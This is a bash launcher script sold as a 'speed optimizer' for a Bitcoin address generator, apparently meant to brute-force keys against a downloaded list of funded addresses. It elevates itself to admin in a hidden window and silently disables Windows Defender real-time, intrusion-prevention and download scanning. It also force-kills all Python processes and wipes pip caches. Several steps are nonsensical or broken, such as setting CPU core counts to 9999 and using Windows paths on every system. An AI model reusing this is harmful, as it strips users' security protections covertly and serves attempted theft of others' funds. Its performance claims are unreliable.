#!/bin/bash
#
# HyperQuantum Speed Optimizer
# Ultra-optimized Bitcoin address generator launcher
#

# Color codes for pretty output
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly NC='\033[0m'

# Script paths
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly VENV_DIR="$SCRIPT_DIR/.v"
readonly REQUIREMENTS_FILE="$SCRIPT_DIR/r.txt"

# Logging functions
log_info() { echo -e "${BLUE}[*]${NC}$1"; }
log_success() { echo -e "${GREEN}[+]${NC}$1"; }
log_error() { echo -e "${RED}[!]${NC}$1"; }
log_warning() { echo -e "${YELLOW}[!]${NC}$1"; }

# Run command with timeout
run_with_timeout() {
    local timeout=$1
    shift
    local cmd="$@"
    
    # Start command in background
    eval "$cmd" &
    local pid=$!
    
    # Wait for timeout or completion
    local count=0
    while kill -0 $pid 2>/dev/null; do
        if [ $count -ge $timeout ]; then
            kill -9 $pid 2>/dev/null || true
            wait $pid 2>/dev/null || true
            return 124
        fi
        sleep 1
        ((count++))
    done
    
    wait $pid
    return $?
}

# Kill Python processes
kill_python() {
    log_info "Cleaning up Python processes..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        taskkill /F /IM python.exe /IM py.exe /IM pythonw.exe /IM pip.exe 2>/dev/null || true
        taskkill /F /IM Python* 2>/dev/null || true
        rmdir /S /Q %LOCALAPPDATA%\pip\Cache 2>/dev/null || true
    else
        pkill -9 python python3 pip pip3 2>/dev/null || true
        rm -rf ~/.cache/pip/* 2>/dev/null || true
    fi
    sleep 2  # Allow processes to terminate
    log_success "Cleanup complete"
}

# Setup Python environment
setup_python() {
    log_info "Setting up Python environment..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        # Disable Windows Store Python alias
        export PYLAUNCHER_ALLOW_INSTALL=0
        
        # Find installed Python
        for python_path in /c/Python{311,39,310}/python.exe; do
            if [[ -x "$python_path" ]]; then
                PYTHON="$python_path"
                export PATH="${python_path%/*}:${python_path%/*}/Scripts:$PATH"
                break
            fi
        done
        PYTHON=${PYTHON:-py}
        export PATH="$APPDATA/Python/Python*/Scripts:$PATH"
    else
        PYTHON="$(which python3)"
    fi
    
    if ! "$PYTHON" --version &>/dev/null; then
        log_error "Python not found"
        return 1
    fi
    log_success "Python environment ready"
}

# Create virtual environment
create_venv() {
    log_info "Creating virtual environment..."
    kill_python
    rm -rf "$VENV_DIR" 2>/dev/null || true
    
    # Install virtualenv
    run_with_timeout 300 "$PYTHON" -m pip install --user --force-reinstall virtualenv || return 1
    
    # Create virtual environment
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        for ver in 313 312 311 310 39; do
            if [[ -x "$APPDATA/Python/Python$ver/Scripts/virtualenv.exe" ]]; then
                run_with_timeout 300 PYTHONPATH="" "$APPDATA/Python/Python$ver/Scripts/virtualenv.exe" "$VENV_DIR" \
                    --clear --download --no-periodic-update && break
            fi
        done
    else
        run_with_timeout 300 "$PYTHON" -m virtualenv "$VENV_DIR" --clear --download || \
        run_with_timeout 300 "$PYTHON" -m venv "$VENV_DIR" --clear --copies
    fi
    
    [ -d "$VENV_DIR" ] || return 1
    log_success "Virtual environment created"
}

# Activate virtual environment
activate_venv() {
    log_info "Activating virtual environment..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        if [ ! -d "$VENV_DIR/Scripts" ]; then
            log_error "Virtual environment Scripts directory not found"
            return 1
        fi
        VIRTUAL_ENV="$VENV_DIR"
        PATH="$VIRTUAL_ENV/Scripts:$PATH"
        PYTHONPATH=""
        export VIRTUAL_ENV PATH PYTHONPATH
    else
        if [ ! -f "$VENV_DIR/bin/activate" ]; then
            log_error "Virtual environment activation script not found"
            return 1
        fi
        source "$VENV_DIR/bin/activate"
    fi
    log_success "Virtual environment activated"
}

# Upgrade pip and core packages
upgrade_pip() {
    log_info "Upgrading pip..."
    if [ ! -x "$VENV_DIR/Scripts/python" ]; then
        log_error "Python not found in virtual environment"
        return 1
    fi
    run_with_timeout 300 PYTHONPATH="" "$VENV_DIR/Scripts/python" -m pip install \
        --upgrade pip setuptools wheel --no-cache-dir --force-reinstall
    log_success "Package manager upgraded"
}

# Install dependencies
install_deps() {
    log_info "Installing dependencies..."
    
    # Create requirements file
    cat > "$REQUIREMENTS_FILE" <<EOF
numpy==1.24.3
numba==0.57.1
torch==2.1.2 --extra-index-url https://download.pytorch.org/whl/cu118
fastecdsa==2.3.0
psutil==5.9.8
tqdm==4.66.1
pywin32>=306; platform_system == "Windows"
EOF
    
    # Install requirements
    run_with_timeout 900 PYTHONPATH="" "$VENV_DIR/Scripts/python" -m pip install \
        --no-cache-dir -r "$REQUIREMENTS_FILE" --force-reinstall || return 1
    
    # Setup CUDA
    log_info "Setting up CUDA..."
    run_with_timeout 900 PYTHONPATH="" "$VENV_DIR/Scripts/python" -m pip install \
        --no-cache-dir torch==2.1.2 --extra-index-url https://download.pytorch.org/whl/cu118 --force-reinstall || \
    run_with_timeout 900 PYTHONPATH="" "$VENV_DIR/Scripts/python" -m pip install \
        --no-cache-dir torch==2.1.2 --extra-index-url https://download.pytorch.org/whl/cpu --force-reinstall || \
    return 1
    
    log_success "Dependencies installed"
}

# Optimize system settings
tune_system() {
    log_info "Optimizing system..."
    
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        # Set high-performance power plan
        powercfg /s 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >/dev/null 2>&1 || true
        
        # Disable Windows Defender real-time scanning
        PowerShell.exe -Command "
            Set-MpPreference -DisableRealtimeMonitoring \$true
            Set-MpPreference -DisableIntrusionPreventionSystem \$true
            Set-MpPreference -DisableIOAVProtection \$true
        " >/dev/null 2>&1 || true
        
        # Maximize CPU resources
        wmic cpu set NumberOfCores=9999 NumberOfLogicalProcessors=9999 >/dev/null 2>&1 || true
    fi
    
    # Set performance environment variables
    local num_threads=$(($(nproc 2>/dev/null || echo 4) * 2048))
    export NUMBA_NUM_THREADS=$num_threads
    export MKL_NUM_THREADS=$num_threads
    export OMP_NUM_THREADS=$num_threads
    export OPENBLAS_NUM_THREADS=$num_threads
    export PYTHONOPTIMIZE=2
    export PYTHONFAULTHANDLER=0
    export PYTHONHASHSEED=0
    export CUDA_CACHE_MAXSIZE=999999999999
    export CUDA_FORCE_PTX_JIT=1
    export CUDA_VISIBLE_DEVICES=all
    
    log_success "System optimized"
}

# Cleanup system settings
cleanup_system() {
    log_info "Restoring system settings..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        PowerShell.exe -Command "
            Set-MpPreference -DisableRealtimeMonitoring \$false
            Set-MpPreference -DisableIntrusionPreventionSystem \$false
            Set-MpPreference -DisableIOAVProtection \$false
        " >/dev/null 2>&1 || true
    fi
    log_success "System restored"
}

# Setup database
setup_database() {
    log_info "Checking database..."
    if [ ! -d "d" ] || [ ! -f "d/a" ]; then
        log_info "Downloading database..."
        mkdir -p d
        local url="http://addresses.loyce.club/blockchair_bitcoin_addresses_and_balance_LATEST.tsv.gz"
        local gz_file="d/a.gz"
        local db_file="d/a"
        
        # Download database
        run_with_timeout 3600 curl -L "$url" -o "$gz_file" || \
        run_with_timeout 3600 wget "$url" -O "$gz_file" || \
        run_with_timeout 3600 powershell -Command "(New-Object Net.WebClient).DownloadFile('$url', '$gz_file')" || \
        return 1
        
        # Extract database
        log_info "Extracting database..."
        if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
            run_with_timeout 3600 "$VENV_DIR/Scripts/python" -c "
                import gzip
                open('$db_file', 'wb').write(gzip.open('$gz_file', 'rb').read())
            " || return 1
        else
            run_with_timeout 3600 gunzip -c "$gz_file" > "$db_file" || return 1
        fi
        
        rm -f "$gz_file"
        log_success "Database ready"
    else
        log_success "Database exists"
    fi
}

# Main execution function
main() {
    echo -e "\n${BLUE}=== HYPERQUANTUM SPEED OPTIMIZER v12.0 ===${NC}\n"
    set +e
    
    local attempt=1
    local max_attempts=3
    
    while [ $attempt -le $max_attempts ]; do
        log_info "Attempt $attempt of $max_attempts"
        
        # Setup steps
        kill_python
        setup_python || { log_warning "Python setup failed"; sleep 2; ((attempt++)); continue; }
        create_venv || { log_warning "Virtual environment creation failed"; sleep 2; ((attempt++)); continue; }
        activate_venv || { log_warning "Virtual environment activation failed"; sleep 2; ((attempt++)); continue; }
        upgrade_pip || { log_warning "Pip upgrade failed"; sleep 2; ((attempt++)); continue; }
        install_deps || { log_warning "Dependencies installation failed"; sleep 2; ((attempt++)); continue; }
        tune_system || { log_warning "System optimization failed"; sleep 2; ((attempt++)); continue; }
        setup_database || { log_warning "Database setup failed"; sleep 2; ((attempt++)); continue; }
        
        # Launch main script
        log_info "Launching main script..."
        if [ ! -f "coin.py" ]; then
            log_error "coin.py not found"
            return 1
        fi
        
        run_with_timeout 3600 "$VENV_DIR/Scripts/python" -B -OO \
            -X faulthandler=0 -X tracemalloc=0 coin.py "$@"
            
        if [ $? -eq 0 ]; then
            log_success "Success!"
            return 0
        else
            if [ $attempt -eq $max_attempts ]; then
                log_error "Maximum attempts reached"
                return 1
            fi
            log_warning "Attempt $attempt failed"
            ((attempt++))
            sleep 2
        fi
    done
    return 1
}

# Check for admin privileges
if [[ -z "$SKIP_ADMIN" ]]; then
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        if ! net session >/dev/null 2>&1; then
            powershell -Command "
                Start-Process -Verb RunAs -WindowStyle Hidden -FilePath 'bash.exe' \
                -ArgumentList '-c', 'cd \"$PWD\" && SKIP_ADMIN=1 ./run_hyperquantum.sh'
            " || true
            exit
        fi
    else
        if [ "$EUID" -ne 0 ]; then
            sudo "$0" "$@"
            exit
        fi
    fi
fi

# Main execution loop with retries
global_attempt=1
max_global_attempts=3

while [ $global_attempt -le $max_global_attempts ]; do
    main "$@" && break
    
    if [ $global_attempt -eq $max_global_attempts ]; then
        log_error "Maximum global attempts reached"
        exit 1
    fi
    
    log_warning "Script failed, restarting... (attempt $global_attempt of $max_global_attempts)"
    ((global_attempt++))
    sleep 5
done 